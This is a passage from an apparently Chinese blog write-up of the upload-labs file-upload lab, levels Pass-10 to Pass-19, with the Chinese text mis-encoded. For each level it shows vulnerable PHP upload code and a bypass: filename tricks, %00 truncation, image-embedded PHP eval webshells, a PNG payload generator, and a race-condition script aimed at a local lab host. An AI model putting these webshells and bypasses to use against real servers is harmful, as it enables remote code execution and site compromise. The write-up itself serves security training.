;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<h3 id="åˆ©ç”¨-å¥å·-ç©ºæ ¼-å¥å·ç»•è¿‡">åˆ©ç”¨<code>. .</code>(å¥å· ç©ºæ ¼ å¥å·)ç»•è¿‡</h3>
<p>è™½ç„¶é¢˜ç›®ä»£ç è¿›è¡Œäº†&quot;deldot&quot;å’Œ&quot;trim&quot;å¯¹æ–‡ä»¶åç»“å°¾åšäº†è¿‡æ»¤,ä½†æ˜¯ç”±äºåªæ‰§è¡Œä¸€æ¬¡,æ‰€ä»¥é…åˆ<code>. .</code>ä¸Šä¼ è¿‡æ»¤å,Urlè§£æå˜æˆäº†Pass-08ä¸€æ ·,æ–‡ä»¶åç¼€å˜æˆ<code>.php.</code></p>
<h3 id="æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®-5">æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®</h3>
<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-10Burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
<br>
<h2 id="pass-11">Pass-11</h2>
<blockquote>
<p>æœ¬passä¼šä»æ–‡ä»¶åä¸­å»é™¤.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccesså­—ç¬¦ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
</code></pre>
<h3 id="åŒå†™åç¼€è¿›è¡Œç»•è¿‡">åŒå†™åç¼€è¿›è¡Œç»•è¿‡</h3>
<p>æœ¬é¢˜æ ¸å¿ƒä»£ç ä¸º</p>
<pre><code class="language-php">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
</code></pre>
<p>ä¸”ä»£ç åªä¼šæ‰§è¡Œä¸€æ¬¡,æ‰€ä»¥å¯ä»¥è¿›è¡ŒåŒå†™æ¥ç»•è¿‡ç¬¬ä¸€æ¬¡æ›¿æ¢,æ¯”å¦‚<code>&quot;.pphphp&quot;</code>,ç»è¿‡ç¨‹åºæ‰§è¡Œå,å°†å˜ä¸º<code>.php</code></p>
<h3 id="æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®-6">æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®</h3>
<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-11Burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
<br>
<h2 id="pass-12">Pass-12</h2>
<blockquote>
<p>æœ¬passä¸Šä¼ è·¯å¾„å¯æ§ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
        }
    } else{
        $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;;
    }
}
</code></pre>
<blockquote>
<p>è¿™ä¸ªæ¼æ´æ»¡è¶³æ¡ä»¶:</p>
<ol>
<li>PHPç‰ˆæœ¬&lt;5.3.4</li>
<li>PHPçš„magic_quotes_gpcå¿…é¡»ä¸ºOffçš„çŠ¶æ€(é»˜è®¤å¼€å¯!!!)</li>
</ol>
<p>è¿™ä¸ªæ¼æ´åŸºæœ¬æ·˜æ±°äº†~</p>
</blockquote>
<h3 id="00æˆªæ–­ç»•è¿‡">%00æˆªæ–­ç»•è¿‡</h3>
<p>ç¨‹åºè¯»å­—ç¬¦è¯»åˆ°%00 åé¢çš„æ•°æ®ä¼šè¢«åœæ­¢ï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯è¯¯æŠŠå®ƒå½“æˆç»“æŸç¬¦ï¼Œåé¢çš„æ•°æ®ç›´æ¥å¿½ç•¥ï¼Œè¿™å°±å¯¼è‡´æ¼æ´äº§ç”Ÿ</p>
<pre><code class="language-php">æœ¬é¢˜å…³é”®åœ¨äºè·¯å¾„
æ­£å¸¸ä¸Šä¼ çš„è·¯å¾„ä¸º:
../upload/xxxjpg
ä½†æˆ‘ä»¬æ„é€ payloadçš„ä¸Šä¼ è·¯å¾„ä¸º:
../upload/1.php%00xxx.jpg
è¿™ä¸ªæ—¶å€™ç¨‹åºå°±ä¼šæ‰§è¡Œ%00æˆªæ–­,æ–‡ä»¶æˆä¸º1.php
</code></pre>
<h3 id="æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®-7">æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®</h3>
<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-12burp%E6%8A%93%E5%8C%85.png" alt="" loading="lazy"></figure>
<br>
<h2 id="pass-13">Pass-13</h2>
<blockquote>
<p>æœ¬passä¸Šä¼ è·¯å¾„å¯æ§ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],&quot;.&quot;)+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path'].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;;
        }
    } else {
        $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;;
    }
}
</code></pre>
<h3 id="00æˆªæ–­ç»•è¿‡-2">%00æˆªæ–­ç»•è¿‡</h3>
<p>æœ¬é¢˜ä¸Pass-12ç±»ä¼¼,åªä¸è¿‡è¯·æ±‚æ–¹æ³•ç”±GETå˜æˆPOST,è¿™ä¸ªæ—¶å€™å°±è¦æ³¨æ„ç”±äºGETè¯·æ±‚æ—¶ä¼šè¿›è¡Œurldecode,è€ŒPOSTè¯·æ±‚æ—¶ä¸ä¼šè¿›è¡Œurldecodeæ‰€ä»¥éœ€è¦æ‰‹åŠ¨è¿›è¡Œurldecode</p>
<h3 id="æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®-8">æŠ“å–æ•°æ®åŒ…å¹¶ä¿®æ”¹æ•°æ®</h3>
<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-13burp%E6%8A%93%E5%8C%85.gif" alt="" loading="lazy"></figure>
<blockquote>
<p>æ–‡ä»¶ååç¼€.php1,è¿™é‡Œå°†1çš„åå…­è¿›åˆ¶çš„å€¼31æ”¹ä¸º00</p>
</blockquote>
<br>
<h2 id="pass-14">Pass-14</h2>
<blockquote>
<p>æœ¬passæ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚ï¼</p>
</blockquote>
<pre><code class="language-php">function getReailFileType($filename){
    $file = fopen($filename, &quot;rb&quot;);
    $bin = fread($file, 2); //åªè¯»2å­—èŠ‚
    fclose($file);
    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;;
    }else{
        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;
        }
    }
}
</code></pre>
<h3 id="å›¾é©¬åˆ¶ä½œ">å›¾é©¬åˆ¶ä½œ</h3>
<p>æœ¬é¢˜ç”¨æ£€æµ‹å†…å®¹çš„æ–¹å¼è¿›è¡ŒéªŒè¯,ä¸”æœ‰æ–‡ä»¶åŒ…å«çš„æ¼æ´,æ‰€ä»¥ç”¨å›¾é©¬+æ–‡ä»¶åŒ…å«æ¥æ‰§è¡Œæ¼æ´</p>
<blockquote>
<p>å‡†å¤‡ä¸€å¼ jpgã€pngæˆ–è€…gifå›¾ç‰‡</p>
<p>å‡†å¤‡ä¸€ä¸ªphp WebShell</p>
</blockquote>
<pre><code class="language-powershell">å›¾ç‰‡ å¤§äº†ä¸€å².jpg
WebShell:
&lt;?php
	phpinfo();
    @eval($_REQUEST[&quot;shell&quot;]);
?&gt;

å›¾é©¬åˆ¶ä½œå‘½ä»¤(Windowsç¯å¢ƒ)

copy å¤§äº†ä¸€å².jpg + a.php b.php


</code></pre>
<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E5%9B%BE%E9%A9%AC%E5%88%B6%E4%BD%9C.png" alt="" loading="lazy"></figure>
<h3 id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</h3>
<p>é¶æœºå·²ç»æä¾›äº†æ–‡ä»¶åŒ…å«æ¼æ´çš„ç½‘é¡µæ–‡ä»¶,è®¿é—®å³å¯</p>
<pre><code class="language-powershell">http://192.168.78.101/upload/include.php?file=upload/xxx(ä¸Šä¼ åçš„æ–‡ä»¶å).jpg
</code></pre>
<br>
<h2 id="pass-15">Pass-15</h2>
<blockquote>
<p>æœ¬passä½¿ç”¨getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ï¼</p>
</blockquote>
<pre><code class="language-php">function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)&gt;=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;;
    }else{
        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;
        }
    }
}
</code></pre>
<h3 id="å›¾é©¬åˆ¶ä½œ-2">å›¾é©¬åˆ¶ä½œ</h3>
<pre><code class="language-powershell">åšgifçš„é©¬

GIF89a

&lt;?php
     phpinfo();
    @eval($_REQUEST[&quot;shell&quot;]);
?&gt;

ä¿å­˜.gifçš„åç¼€

</code></pre>
<h3 id="æ–‡ä»¶åŒ…å«-2">æ–‡ä»¶åŒ…å«</h3>
<p>ä¸Šä¼ ,æ–‡ä»¶åŒ…å«è®¿é—®æ‰§è¡Œä»£ç </p>
<pre><code class="language-powershell">http://192.168.78.101/upload/include.php?file=upload/xxx(ä¸Šä¼ åçš„æ–‡ä»¶å).gif
</code></pre>
<br>
<h2 id="pass-16">Pass-16</h2>
<blockquote>
<p>æœ¬passä½¿ç”¨exif_imagetype()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ï¼</p>
</blockquote>
<pre><code class="language-php">function isImage($filename){
    //éœ€è¦å¼€å¯php_exifæ¨¡å—
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return &quot;gif&quot;;
            break;
        case IMAGETYPE_JPEG:
            return &quot;jpg&quot;;
            break;
        case IMAGETYPE_PNG:
            return &quot;png&quot;;
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;;
    }else{
        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;
        }
    }
}
</code></pre>
<blockquote>
<p>è¿™é¢˜è¿˜æ˜¯ç”¨Pass-15çš„gifé©¬,ä¸€æ¨¡ä¸€æ ·çš„æµç¨‹</p>
</blockquote>
<br>
<h2 id="pass-17">Pass-17</h2>
<blockquote>
<p>æœ¬passé‡æ–°æ¸²æŸ“äº†å›¾ç‰‡ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å
    $fileext= substr(strrchr($filename,&quot;.&quot;),1);

    //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ
    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;
                @unlink($target_path);
            }else{
                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
                srand(time());
                $newfilename = strval(rand()).&quot;.jpg&quot;;
                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;
        }

    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;
                @unlink($target_path);
            }else{
                 //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
                srand(time());
                $newfilename = strval(rand()).&quot;.png&quot;;
                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;
        }

    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;
                @unlink($target_path);
            }else{
                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
                srand(time());
                $newfilename = strval(rand()).&quot;.gif&quot;;
                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;
        }
    }else{
        $msg = &quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;;
    }
}
</code></pre>
<h4 id="äºŒæ¬¡æ¸²æŸ“ç»•è¿‡">äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</h4>
<blockquote>
<p>äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ä»‹ç»https://xz.aliyun.com/t/2657</p>
</blockquote>
<h3 id="ç¼–å†™è„šæœ¬">ç¼–å†™è„šæœ¬</h3>
<blockquote>
<p>éœ€è¦linuxç¯å¢ƒ,å®æµ‹Windowsè·‘å‡ºæ¥çš„æ–‡ä»¶æ²¡æœ‰å…³é”®ä»£ç </p>
</blockquote>
<pre><code class="language-php">æ–°å»ºä¸€ä¸ªpayload.phpæ–‡ä»¶

&lt;?php
//png.php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0xe, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x1, 0xdc, 0x5a, 0x1, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y &lt; sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'./payload.png');
?&gt;

å‡†å¤‡ä¸€å¼ pngå›¾ç‰‡

æ‰§è¡Œå‘½ä»¤
php payload.php 1.png
å¾—åˆ°ä¸€å¼ payload.png
    
é‡Œé¢åŒ…å«ä¸€å¥è¯æœ¨é©¬
&lt;?=$_GET[0]($_POST[1]);?&gt;
</code></pre>
<h3 id="æ–‡ä»¶åŒ…å«-3">æ–‡ä»¶åŒ…å«</h3>
<p>ä½¿ç”¨include.phpåŒ…å«ä¸Šä¼ çš„å›¾ç‰‡,ä½¿ç”¨AntSwordè¿æ¥ä¸€å¥è¯æœ¨é©¬å³å¯</p>
<br>
<h2 id="pass-18">Pass-18</h2>
<blockquote>
<p>éœ€è¦ä»£ç å®¡è®¡ï¼</p>
</blockquote>
<pre><code class="language-php">$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;;
            unlink($upload_file);
        }
    }else{
        $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
    }
}
</code></pre>
<h3 id="æ¡ä»¶ç«äº‰æ¼æ´">æ¡ä»¶ç«äº‰æ¼æ´</h3>
<p>è¿™é‡Œå…ˆæ˜¯ä¸Šä¼ æ–‡ä»¶ä¸´æ—¶ä¿å­˜,æ¥ç€è¿›è¡Œæ–‡ä»¶ç±»å‹åˆ¤æ–­,å¦‚æœç™½åå•ä¸å­˜åœ¨å°±åˆ é™¤æ–‡ä»¶,å¦‚æœç™½åå•å­˜åœ¨å°±é‡å‘½åæ–‡ä»¶ä¿å­˜,æ‰€ä»¥è¿™é‡Œå­˜åœ¨æ¡ä»¶ç«äº‰</p>
<h3 id="å¤ç°æ¼æ´">å¤ç°æ¼æ´</h3>
<p>æ–°å»ºä¸€ä¸ªphp_payload.phpæ–‡ä»¶</p>
<pre><code class="language-php">&lt;?php
	fputs(fopen('shell.php','w'),'&lt;?php phpinfo();?&gt;');
?&gt;
</code></pre>
<p>æ–°å»ºä¸€ä¸ªpython_payload.py</p>
<pre><code class="language-python">import requests
def main():
    i=0
    while 1:
        try:
            a=requests.get(&quot;http://192.168.78.101/upload/upload/php_payload.php&quot;)
            if a.status_code==200:
                print(&quot;ok&quot;)
                break
        except Exception as e:
            pass
        print(i)
        i+=1

if __name__=='__main__':
    main()
</code></pre>
<p>æŠ“åŒ…Ctrl+i,é€å…¥æµ‹è¯•å™¨,è°ƒæ•´å‚æ•°:ä½ç½®-&gt;$æ¸…æ¥š,æœ‰æ•ˆè´Ÿå€º-&gt;æ²¡æœ‰è´Ÿå€º,æ— é™æœŸåœ°é‡å¤,é€‰é¡¹-&gt;çº¿ç¨‹æ•°20</p>
<figure data-type="image" tabindex="20"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-18Burp%E6%B5%8B%E8%AF%95%E5%99%A8.gif" alt="" loading="lazy"></figure>
<p>æ‰§è¡Œpythonè„šæœ¬,ç›´è‡³è¾“å…¥OK(å°½é‡å¤šè¯•å‡ æ¬¡,æœ‰æ—¶å€™è¿”å›ok,ç»“æœæ²¡æœ‰ç”Ÿæˆæ–‡ä»¶)</p>
<p>è®¿é—®<code>http://192.168.78.101/upload/upload/shell.php</code>,å¦‚æœè®¿é—®é”™è¯¯,è¯·å¤šæ¬¡å°è¯•å¤ç°æ¼æ´</p>
<br>
<h2 id="pass-19">Pass-19</h2>
<blockquote>
<p>éœ€è¦ä»£ç å®¡è®¡ï¼</p>
</blockquote>
<pre><code class="language-php">//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once(&quot;./myupload.php&quot;);
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u-&gt;upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;
            break;
        case 2:
            $msg = 'æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚';
            break; 
        case -1:
            $msg = 'è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚';
            break; 
        case -2:
            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚';
            break; 
        case -3:
            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚';
            break; 
        case -4:
            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚';
            break; 
        case -5:
            $msg = 'ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚';
            break; 
        case -6:
            $msg = 'æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚';
            break;      
        default:
            $msg = 'æœªçŸ¥é”™è¯¯ï¼';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,
      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this-&gt;isUploadedFile();
    
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;setDir( $dir );
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;checkExtension();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;checkSize();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this-&gt;cls_file_exists == 1 ){
      
      $ret = $this-&gt;checkFileExists();
      if( $ret != 1 ){
        return $this-&gt;resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

